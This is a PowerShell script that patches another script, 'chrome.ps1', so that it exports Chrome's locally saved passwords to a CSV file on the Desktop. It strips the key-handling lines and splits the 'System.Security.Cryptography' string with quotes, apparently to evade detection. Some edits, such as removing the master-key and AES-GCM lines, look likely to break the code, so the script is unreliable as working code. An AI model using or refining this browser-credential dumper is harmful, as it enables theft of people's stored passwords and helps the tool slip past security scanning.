$c = Get-Content 'chrome.ps1' -Raw
$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
$c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
$c = $c -replace '#requires -version 7', ''
$c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '0x00'

# Need to fully strip the line to avoid parsing error due to remaining parenthesis
$c = $c -replace '(?m)^\s*\$Script:GCMKey\s*=\s*\[AesGcm\]::new\([^)]*\).*$', ''
$c = $c -replace '(?m)^\s*\$masterKey\s*=\s*\[ProtectedData\]::Unprotect\([^)]*\).*$', ''

$c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
Set-Content "v4.ps1" -Value $c
